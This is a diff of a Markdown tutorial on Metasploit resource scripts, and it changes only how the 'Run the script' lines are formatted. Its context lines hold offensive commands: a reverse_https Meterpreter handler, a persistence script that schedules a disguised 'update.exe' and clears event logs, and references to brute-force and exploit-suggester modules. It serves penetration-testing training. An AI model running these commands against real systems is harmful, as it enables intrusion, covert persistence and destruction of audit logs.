@@ -71,7 +71,7 @@ Open your text editor and copy/past the follow two metasploit core commands to i
   version
   exit -y
 ```
-**[terminal]::run the script::** msfconsole -r /root/version.rc
+**[in terminal]::run the script::** `msfconsole -r /root/version.rc`
 
 <br />
 
@@ -81,7 +81,7 @@ The next example show us how to use msfconsole 'makerc' core command to write ou
    msf > version
    msf > makerc /root/version.rc
 ```
-**[msfconsole]::Run the script::** resource /root/version.rc
+**[in msfconsole]::Run the script::** `resource /root/version.rc`
 
 <br /><br />
 
@@ -96,7 +96,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    set LPORT 666
    exploit
 ```
-**[terminal]::Run the script::** msfconsole -r /root/handler.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/handler.rc`
 
 <br />
 
@@ -111,7 +111,7 @@ The next example show us how to use msfconsole makerc core command to write our 
    msf exploit(multi/handler) > exploit
    msf exploit(multi/handler) > makerc /root/handler.rc
 ```
-**[msfconsole]::Run the script::** resource /root/handler.rc
+**[in msfconsole]::Run the script::** `resource /root/handler.rc`
 
 <br /><br />
 
@@ -126,7 +126,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    resource /root/handler.rc
    makerc /root/commands.rc
 ```
-**[terminal]::Run the script::** msfconsole -r /root/record.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/record.rc`
 
 ![gif](http://i68.tinypic.com/343oefb.gif)
 
@@ -152,7 +152,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
      use post/multi/recon/local_exploit_suggester
    run
 ```
-**[meterpreter]::Run the script::** resource /root/post.rc
+**[in meterpreter]::Run the script::** `resource /root/post.rc`
 
 <br /><br />
 
@@ -169,7 +169,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
   scheduleme -m 10 -c "%temp%\\update.exe"
  clearev
 ```
-**[meterpreter]::Run the script::** resource /root/persistence.rc
+**[in meterpreter]::Run the script::** `resource /root/persistence.rc`
 
 <br /><br />
 
@@ -187,7 +187,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    run
    unsetg RHOSTS THREADS
 ```
-**[meterpreter]::Run the script::** resource /root/http_brute.rc
+**[in meterpreter]::Run the script::** `resource /root/http_brute.rc`
 
 ![gif](http://i66.tinypic.com/2usid92.gif)
 
@@ -222,11 +222,11 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    exploit
    unsetg RESOURCE
 ```
-**[terminal]::Run the script::** msfconsole -r /root/post_handler.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/post_handler.rc`
 
 <br /><br />
 
-- **[Handler]::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
+- **[in Handler]::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
 <blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>
 
       sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'
@@ -274,7 +274,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
     run_single("db_export -f xml template.xml")
 </ruby>
 ```
-**[terminal]::Run the script:** msfconsole -r /root/template.rc
+**[in terminal]::Run the script:** `msfconsole -r /root/template.rc`
 
 <br /><br />
 
@@ -312,7 +312,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
      run_single("hosts -d")
    </ruby>
 ```
-**[terminal]::Run the script::** msfconsole -r /root/http_recon.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/http_recon.rc`
 
 <br /><br />
 
@@ -455,7 +455,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
      run_single("hosts -d")
    </ruby>
 ```
-**[terminal]::Run the script::** msfconsole -r /root/brute_force.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/brute_force.rc`
 
 <br /><br />
 
@@ -504,7 +504,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
      run_single("hosts -d")
    </ruby>
 ```
-**[terminal]::Run the script::** msfconsole -r /root/snmp_enum.rc
+**[in terminal]::Run the script::** `msfconsole -r /root/snmp_enum.rc`
 
 <br />
 
